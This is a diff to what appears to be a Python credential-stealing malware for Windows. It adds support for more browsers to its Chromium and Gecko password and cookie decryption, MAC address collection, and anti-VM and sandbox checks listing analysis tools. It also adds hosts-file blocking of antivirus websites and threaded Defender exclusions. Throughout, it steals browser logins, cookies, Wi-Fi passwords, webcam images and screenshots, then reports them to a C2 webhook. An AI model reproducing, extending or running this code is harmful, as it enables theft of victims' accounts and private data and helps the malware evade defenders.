@@ -198,6 +198,8 @@ def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
     except Exception as e:
         print(f"Error decrypting v20 password: {str(e)}", "ERROR")
         return None
+
+
 def removedir(dir_):
     try:
         shutil.rmtree(dir_)
@@ -212,7 +214,7 @@ def load_nss(profile_path, nss3):
 
 def kill():
     if config.browsers:
-        exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+        exes = ['msedge.exe', 'orbitum.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
     
         for exe in exes:
             subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -271,6 +273,13 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     decrypted_pass = decrypted_pass[:-16].decode()
     return decrypted_pass
 
+def decrypt_old(buff: bytes) -> str:
+    try:
+        decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+        return decrypted_pass.decode()
+    except Exception as e:
+        return None
+
 localappdata = os.getenv('localappdata')
 appdata = os.getenv('appdata')
 
@@ -325,53 +334,42 @@ def systeminfo():
     global system_info, process_count
     syst_ = os.path.join(output, 'System')
     os.makedirs(syst_, exist_ok=True)
+
     sysinfooutput = os.path.join(syst_, 'System.txt')
     ipoutput = os.path.join(syst_, 'IP Info.txt')
     procinfooutput = os.path.join(syst_, 'Processes.txt')
+    macoutput = os.path.join(syst_, 'MAC Address.txt')
+
     ram = psutil.virtual_memory()
     totalram = ram.total
     availableram = ram.available
     ramusage = ram.percent
     usedram = ram.used
     freeram = ram.free
-   
+
+    macaddress = subprocess.check_output("getmac", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().strip().replace('\r\n', '\n')
     operatingsystem = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     buildtype = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).BuildType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     serialnumber = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SerialNumber", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-    
     productkey = subprocess.check_output("powershell (Get-CimInstance -Class SoftwareLicensingService).OA3xOriginalProductKey", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
     installdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).InstallDate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     bootdate = subprocess.check_output("powershell (Get-CimInstance Win32_OperatingSystem).LastBootUpTime", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     refreshrate = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).MaxRefreshRate", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-    
     timezone = subprocess.check_output("powershell (Get-CimInstance Win32_TimeZone).Caption", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-    
     model = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).Model", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
     systemtype = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystem).SystemType", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
     processor = subprocess.check_output("powershell (Get-CimInstance Win32_Processor).Name", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
     biosversion = subprocess.check_output("powershell (Get-CimInstance Win32_BIOS).SMBIOSBIOSVersion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-
     screenwidth = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentHorizontalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     screenheight = subprocess.check_output("powershell (Get-CimInstance Win32_VideoController).CurrentVerticalResolution", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-   
     antiviruses = subprocess.check_output("powershell (Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName 'AntivirusProduct').DisplayName", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip().replace('\r\n', '\n')
-   
-    information = subprocess.run('systeminfo', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
    
     ip_info = requests.get(base64.b64decode('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==').decode('utf-8'))
    
     sys_lines = []
     ip_lines = []
     proc_lines = []
+    mac_lines = []
     if ip_info.status_code in [200, 201, 204]:
         ipinf = ip_info.json()
         ip_lines.append(f'IP Address: {ipinf.get("ip", "None")}')
@@ -399,7 +397,7 @@ def systeminfo():
         for i, (network, password) in enumerate(wifilist):
             sys_lines.append(f'[{i + 1}]: {network}: {password}')
 
-    sys_lines.append(f'Antiviruses Installed:')
+    sys_lines.append(f'\nAntiviruses Installed:')
     for i, av in enumerate(antiviruses.splitlines()):
         sys_lines.append(f'[{i + 1}]: {av}')
 
@@ -407,13 +405,19 @@ def systeminfo():
 
     sys_lines.append(f'Screen Resolution: {screenwidth}x{screenheight}\n')
 
-    sys_lines.append(f'Refresh Rate: {refreshrate}hz\n')
+    sys_lines.append(f'Refresh Rate: {refreshrate}Hz\n')
+
+    mac_lines.append(macaddress)
 
     write(sysinfooutput, '\n'.join(sys_lines))
     system_info = 1
+
     write(ipoutput, '\n'.join(ip_lines))
+
     write(procinfooutput, '\n'.join(proc_lines))
     process_count = len(proc_lines)
+
+    write(macoutput, '\n'.join(mac_lines))
 
 def get_webcam():
     global webcam_success
@@ -452,7 +456,177 @@ def screenshot():
         ss_success = 1
     except:
         ss_success = 0
-    
+
+def antivm(): # THIS IS UNFINISHED
+    vm_indicators = [
+        "VBOX", "VIRTUALBOX", "VMWARE", "VIRTUAL", "HYPERV", "QEMU", "XEN", "PARALLELS"
+    ]
+    for indicator in vm_indicators:
+        if indicator in platform.uname().system.upper() or indicator in platform.uname().node.upper():
+            return True
+    return False
+
+    blacklistedips = ['88.86.117.130', '34.172.125.33', '85.203.46.34', '85.203.46.153', '45.91.22.73', ]
+    sandboxuuids = [
+        '1D1FB0BB-21B9-4FC0-B017-A4DADA231E17',
+        '20DC9FCF-04F2-46DB-866A-8B094D51E731',
+        '4E29518F-71BD-4AD3-AEAA-B9B737A21F6F',
+        'CF39B3BF-A04E-44F3-80E5-56A5937FA2A9',
+        '0C32A046-8B53-47AC-9B09-39B209E8FE02',
+        '671BC5F7-4B0F-FF43-B923-8B1645581DC8',
+        '9DAD8B1F-2B6B-4C1B-9EFD-0EFBFCFDCDB7',
+        '00000000-0000-0000-0000-000000000000',
+        '11111111-1111-1111-1111-111111111111',
+        '7AB5C494-39F5-4941-9163-47F54D6D5016',
+        '032E02B4-0499-05C3-0806-3C0700080009',
+        '03DE0294-0480-05DE-1A06-350700080009',
+        '11111111-2222-3333-4444-555555555555',
+        '6F3CA5EC-BEC9-4A4D-8274-11168F640058',
+        'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548',
+        '4C4C4544-0050-3710-8058-CAC04F59344A',
+        '00000000-0000-0000-0000-AC1F6BD04972',
+        '5BD24D56-789F-8468-7CDC-CAA7222CC121',
+        '49434D53-0200-9065-2500-65902500E439',
+        '49434D53-0200-9036-2500-36902500F022',
+        '777D84B3-88D1-451C-93E4-D235177420A7',
+        '49434D53-0200-9036-2500-369025000C65',
+        'B1112042-52E8-E25B-3655-6A4F54155DBF',
+        '00000000-0000-0000-0000-AC1F6BD048FE',
+        'EB16924B-FB6D-4FA1-8666-17B91F62FB37',
+        'A15A930C-8251-9645-AF63-E45AD728C20C',
+        '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
+        'C7D23342-A5D4-68A1-59AC-CF40F735B363',
+        '63203342-0EB0-AA1A-4DF5-3FB37DBB0670',
+        '44B94D56-65AB-DC02-86A0-98143A7423BF',
+        '6608003F-ECE4-494E-B07E-1C4615D1D93C',
+        'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
+        '49434D53-0200-9036-2500-369025003AF0',
+        '8B4E8278-525C-7343-B825-280AEBCD3BCB',
+        '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27',
+        '79AF5279-16CF-4094-9758-F88A616D81B4',
+        'FE822042-A70C-D08B-F1D1-C207055A488F',
+        '76122042-C286-FA81-F0A8-514CC507B250',
+        '481E2042-A1AF-D390-CE06-A8F783B1E76A',
+        'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
+        '9961A120-E691-4FFE-B67B-F0E4115D5919',
+        'FF577B79-782E-0A4D-8568-B35A9B7EB76B',
+        '08C1E400-3C56-11EA-8000-3CECEF43FEDE',
+        '6ECEAF72-3548-476C-BD8D-73134A9182C8',
+        '49434D53-0200-9036-2500-369025003865',
+        '119602E8-92F9-BD4B-8979-DA682276D385',
+        '12204D56-28C0-AB03-51B7-44A8B7525250',
+        '63FA3342-31C7-4E8E-8089-DAFF6CE5E967',
+        '365B4000-3B25-11EA-8000-3CECEF44010C',
+        'D8C30328-1B06-4611-8E3C-E433F4F9794E',
+        '00000000-0000-0000-0000-50E5493391EF',
+        '00000000-0000-0000-0000-AC1F6BD04D98',
+        '4CB82042-BA8F-1748-C941-363C391CA7F3',
+        'B6464A2B-92C7-4B95-A2D0-E5410081B812',
+        'BB233342-2E01-718F-D4A1-E7F69D026428',
+        '9921DE3A-5C1A-DF11-9078-563412000026',
+        'CC5B3F62-2A04-4D2E-A46C-AA41B7050712',
+        '00000000-0000-0000-0000-AC1F6BD04986',
+        'C249957A-AA08-4B21-933F-9271BEC63C85',
+        'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E',
+        'ACA69200-3C4C-11EA-8000-3CECEF4401AA',
+        '3F284CA4-8BDF-489B-A273-41B44D668F6D',
+        'BB64E044-87BA-C847-BC0A-C797D1A16A50',
+        '2E6FB594-9D55-4424-8E74-CE25A25E36B0',
+        '42A82042-3F13-512F-5E3D-6BF4FFFD8518',
+        '38AB3342-66B0-7175-0B23-F390B3728B78',
+        '48941AE9-D52F-11DF-BBDA-503734826431',
+        'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C',
+        'E08DE9AA-C704-4261-B32D-57B2A3993518',
+        '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9',
+        '88DC3342-12E6-7D62-B0AE-C80E578E7B07',
+        '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E',
+        '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE',
+        '0934E336-72E4-4E6A-B3E5-383BD8E938C3',
+        '12EE3342-87A2-32DE-A390-4C2DA4D512E9',
+        '38813342-D7D0-DFC8-C56F-7FC9DFE5C972',
+        '8DA62042-8B59-B4E3-D232-38B29A10964A',
+        '3A9F3342-D1F2-DF37-68AE-C10F60BFB462',
+        'F5744000-3C78-11EA-8000-3CECEF43FEFE',
+        'FA8C2042-205D-13B0-FCB5-C5CC55577A35',
+        'C6B32042-4EC3-6FDF-C725-6F63914DA7C7',
+        'FCE23342-91F1-EAFC-BA97-5AAE4509E173',
+        'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F',
+        '050C3342-FADD-AEDF-EF24-C6454E1A73C9',
+        '4DC32042-E601-F329-21C1-03F27564FD6C',
+        'DEAEB8CE-A573-9F48-BD40-62ED6C223F20',
+        '05790C00-3B21-11EA-8000-3CECEF4400D0',
+        '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57',
+        '9C6D1742-046D-BC94-ED09-C36F70CC9A91',
+        '907A2A79-7116-4CB6-9FA5-E5A58C4587CD',
+        'A9C83342-4800-0578-1EE8-BA26D2A678D2',
+        'D7382042-00A0-A6F0-1E51-FD1BBF06CD71',
+        '1D4D3342-D6C4-710C-98A3-9CC6571234D5',
+        'CE352E42-9339-8484-293A-BD50CDC639A5',
+        '60C83342-0A97-928D-7316-5F1080A78E72',
+        '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A',
+        'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F',
+        'FED63342-E0D6-C669-D53F-253D696D74DA',
+        '2DD1B176-C043-49A4-830F-C623FFB88F3C',
+        '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
+        '84FE3342-6C67-5FC6-5639-9B3CA3D775A1',
+        'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D',
+        'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
+        'A7721742-BE24-8A1C-B859-D7F8251A83D3',
+        '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E',
+        'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
+        'EADD1742-4807-00A0-F92E-CCD933E9D8C1',
+        'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1',
+        'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
+        '921E2042-70D3-F9F1-8CBD-B398A21F89C6'
+    ]
+    vm_files = [
+        "C:\\windows\\system32\\vmGuestLib.dll",
+        "C:\\windows\\system32\\vm3dgl.dll",
+        "C:\\windows\\system32\\vboxhook.dll",
+        "C:\\windows\\system32\\vboxmrxnp.dll",
+        "C:\\windows\\system32\\vmsrvc.dll",
+        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+    ]
+    blacklisted_processes = [
+        'vmtoolsd.exe', 
+        'vmwaretray.exe', 
+        'vmwareuser.exe'
+        'fakenet.exe', 
+        'dumpcap.exe', 
+        'httpdebuggerui.exe', 
+        'wireshark.exe', 
+        'fiddler.exe', 
+        'vboxservice.exe', 
+        'df5serv.exe', 
+        'vboxtray.exe', 
+        'vmwaretray.exe', 
+        'ida64.exe', 
+        'ollydbg.exe', 
+        'pestudio.exe', 
+        'vgauthservice.exe', 
+        'vmacthlp.exe', 
+        'x96dbg.exe', 
+        'x32dbg.exe', 
+        'prl_cc.exe', 
+        'prl_tools.exe', 
+        'xenservice.exe', 
+        'qemu-ga.exe', 
+        'joeboxcontrol.exe', 
+        'ksdumperclient.exe', 
+        'ksdumper.exe', 
+        'joeboxserver.exe', 
+    ]
+    if hwid in sandboxuuids:
+        return True
+    if psutil.process_iter(attrs=['name']):
+        for process in psutil.process_iter(attrs=['name']):
+            if process.info['name'] in blacklisted_processes:
+                return True
+    for file in vm_files:
+        if os.path.exists(file):
+            return True
+    return False
+
 def persistence(copypath):
     try:
         shutil.copy2(sys.executable, copypath)
@@ -480,6 +654,7 @@ def stealchromium():
             'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
             'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
             'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
+            'Orbitum': {'path': localappdata + '\\Orbitum\\User Data', 'localstate': localappdata + '\\Orbitum\\User Data\\Local State'}, #(?)
             'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
             'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State'},
             'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
@@ -493,6 +668,7 @@ def stealchromium():
             'Avast': {'path': localappdata + '\\AVAST Software\\Browser\\User Data', 'localstate': localappdata + '\\AVAST Software\\Browser\\User Data\\Local State'},
             'Epic': {'path': localappdata + '\\Epic Privacy Browser\\User Data', 'localstate': localappdata + '\\Epic Privacy Browser\\User Data\\Local State'},
             'Thorium': {'path': localappdata + '\\Thorium\\User Data', 'localstate': localappdata + '\\Thorium\\User Data\\Local State'}, 
+            "Blisk": {'path': localappdata + '\\Blisk\\User Data', 'localstate': localappdata + '\\Blisk\\User Data\\Local State'},
             'Cromite': {'path': localappdata + '\\Cromite\\User Data', 'localstate': localappdata + '\\Cromite\\User Data\\Local State'},
             'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State'},
             'Edge SxS': {'path': localappdata + '\\Microsoft\\Edge SxS\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge SxS\\User Data\\Local State'},
@@ -527,6 +703,8 @@ def stealchromium():
                 #print(profile_path)
                 
                 cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
+                if not os.path.exists(cookie_path):
+                    cookie_path = os.path.join(profile_path, 'Cookies')
                 password_path = os.path.join(profile_path, 'Login Data')
                 autofill_path = os.path.join(profile_path, 'Web Data')
                 history_path = os.path.join(profile_path, 'History')
@@ -556,9 +734,16 @@ def stealchromium():
                         cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                         try:
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
-                                line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
-                                write(cookieoutput, line)
-                                cookie_count += 1
+                                if value.startswith(b'v10') or value.startswith(b'v11'):
+                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
+                                    write(cookieoutput, line)
+                                    cookie_count += 1
+                                elif value.startswith(b'v20'):
+                                    pass
+                                else:
+                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_old(value)}\n"
+                                    write(cookieoutput, line)
+                                    cookie_count += 1
                         except Exception as e:
                            pass
                         cur.close()
@@ -576,9 +761,17 @@ def stealchromium():
                     try:
                         for host, c0name, value in cur.fetchall():
                             if c0name and value:
-                               line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_password(value, master_key)}\n---------------------------------\n"
-                               write(passwordoutput, line)
-                               password_count += 1
+                                if value.startswith(b'v10') or value.startswith(b'v11'):
+                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_password(value, master_key)}\n---------------------------------\n"
+                                    write(passwordoutput, line)
+                                    password_count += 1
+                                elif value.startswith(b'v20'):
+                                    pass
+                                else:
+                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_old(value)}\n---------------------------------\n"
+                                    write(passwordoutput, line)
+                                    password_count += 1
+
                     except Exception as e:
                         pass
                     cur.close()
@@ -618,6 +811,8 @@ def stealchromiumv20():
             'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State', 'key': 'Opera Softwarekey1'},
             'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State', 'key': 'Opera Softwarekey1'},
             'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State', 'key': 'Vivaldikey1'},
+            'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State', 'key': 'Escosiabrowserkey1'},
+            'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State', 'key': 'Holakey1'},
             }
 
         for name, path in chromium_paths.items():
@@ -698,7 +893,12 @@ def stealgecko():
             "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
             "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
             "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
-            "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
+            "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"},
+            "K-Meleon": {"path": appdata + "\\K-Meleon\\Profiles", "nss": "C:\\Program Files\\K-Meleon\\nss3.dll"},
+            "Pale Moon": {"path": appdata + "\\Moonchild Productions\\Pale Moon\\Profiles", "nss": "C:\\Program Files\\Pale Moon\\nss3.dll"},
+            "Basilisk": {"path": appdata + "\\Moonchild Productions\\Basilisk\\Profiles", "nss": "C:\\Program Files\\Basilisk\\nss3.dll"},
+            "LibreWolf": {"path": appdata + "\\LibreWolf\\Profiles", "nss": "C:\\Program Files\\LibreWolf\\nss3.dll"},
+            "IceWeasel": {"path": appdata + "\\IceWeasel\\Profiles", "nss": "C:\\Program Files (x86)\\IceWeasel\\nss3.dll"},
         }
         for name, path in gecko_paths.items():
             nss = path['nss']
@@ -1054,12 +1254,25 @@ def collectminecraft():
             if os.path.exists(file_):
                 try:
                     os.makedirs(os.path.join(minecraftoutput, 'Modrinth'), exist_ok=True)
-                    shutil.copy2(file_, os.path.join(minecraftoutput, 'Modrinth', os.path.basename(file_)))
                     modrn += 1
                 except:
                     pass
         if modrn == 3:
             minecraft_sessions += 1
+
+def blockwebsite(url):
+    try:
+        with open(os.path.join(os.getenv('systemroot'), 'System32', 'drivers', 'etc', 'hosts'), 'a') as f:
+            f.write(f"0.0.0.0 {url}\n")
+    except Exception as e:
+        pass
+
+def blockantivirus():
+    if config.blocksites:
+        avwebsites = ['avast.com', 'avg.com', 'malwarebytes.com', 'kaspersky.com', 'norton.com', 'bitdefender.com', 'mcafee.com', 'trendmicro.com', 'sophos.com', 'avira.com']
+        for site in avwebsites:
+            blockwebsite(site)
+            blockwebsite('www.' + site)
 
 
 def makepath():
@@ -1119,17 +1332,31 @@ if appdpath:
 else:
     copypath = sys.executable
 
+if config.antivm:
+    if is_vm():
+        sys.exit(0)
+
 if not isadmin():
     askforadmin()
 
-exclusion(sys.executable)
-exclusion(copypath)
-exclusion(os.getenv('userprofile'))
+e1 = threading.Thread(target=exclusion, args=(sys.executable,))
+e1.start()
+
+e2 = threading.Thread(target=exclusion, args=(copypath,))
+e2.start()
+
+e3 = threading.Thread(target=exclusion, args=(os.getenv('userprofile'),))
+e3.start()
+
+#exclusion(sys.executable)
+#exclusion(copypath)
+#exclusion(os.getenv('userprofile'))
 
 kill()
 thread = threading.Thread(target=persistence, args=(copypath,))
 thread.start()
-funcs = [systeminfo, get_webcam, get_clipboard, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam]
+is_vm = antivm()
+funcs = [systeminfo, get_webcam, get_clipboard, screenshot, stealchromium, stealgecko, stealchromiumv20, stealdiscordacc, collectminecraft, collectgeometrydash, collectsteam, blockantivirus]
 # systeminfo()
 # screenshot()
 # kill()
@@ -1177,7 +1404,7 @@ def sendtoc2(file):
           "embeds": [
             {
               "title": "GOD BLESS AMERICA",
-              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Session: {'Yes' if gd_session == 1 else 'No'}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
+              "description": f"```\nTotal Cookies: {str(cookie_count)}\nTotal Passwords: {str(password_count)}\nTotal Autofills: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal Discord Accounts: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nTotal Processes: {str(process_count)}\nSteam Session: {'Yes' if steam_session else 'No'}\nGD Session: {'Yes' if gd_session == 1 else 'No'}\nWebcam: {'Yes' if webcam_success == 1 else 'No'}\nClipboard: {'Yes' if clipboard_success == 1 else 'No'}\nSystem Info: {'Yes' if system_info == 1 else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nWi-Fi Networks: {str(wifiprofiles)}\nVM: {'Yes' if is_vm else 'No'}\n```\n\ncreds: ||{download}||",
               "color": 3866871,
               "author": {
                 "name": "KirkG"
@@ -1212,6 +1439,7 @@ Clipboard: {'Yes' if clipboard_success == 1 else 'No'}
 System Info: {'Yes' if system_info == 1 else 'No'}
 Screenshot: {"Yes" if ss_success == 1 else "No"}
 Wi-Fi Networks: {str(wifiprofiles)}
+VM: {'Yes' if is_vm else 'No'}
 Credentials: {download}
         '''
         payload = {
